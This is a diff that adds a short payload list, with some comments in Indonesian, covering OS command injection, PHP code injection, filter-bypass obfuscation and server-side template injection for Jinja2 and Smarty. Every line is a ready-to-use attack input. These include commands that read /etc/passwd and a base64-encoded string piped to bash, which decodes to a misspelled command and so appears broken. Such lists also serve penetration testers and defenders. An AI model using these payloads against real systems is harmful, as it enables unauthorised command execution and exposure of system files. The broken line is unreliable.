@@ -1,0 +1,22 @@
+# 1. OS Command Injection (Standard)
+; id
+; whoami
+| id
+`id`
+$(id)
+
+# 2. PHP Code Injection 
+<?php system("id"); ?>
+<?php echo shell_exec("whoami"); ?>
+${phpinfo()}
+
+# 3. Bypass Filter / Obfuscation 
+;wh$1oami
+;echo "b3VhbWk=" | base64 -d | bash
+{cat,/etc/passwd}
+
+# 4. SSTI (Server Side Template Injection)
+# Buat Jinja2 (Python/Flask)
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+# Buat Smarty (PHP)
+{system('id')}
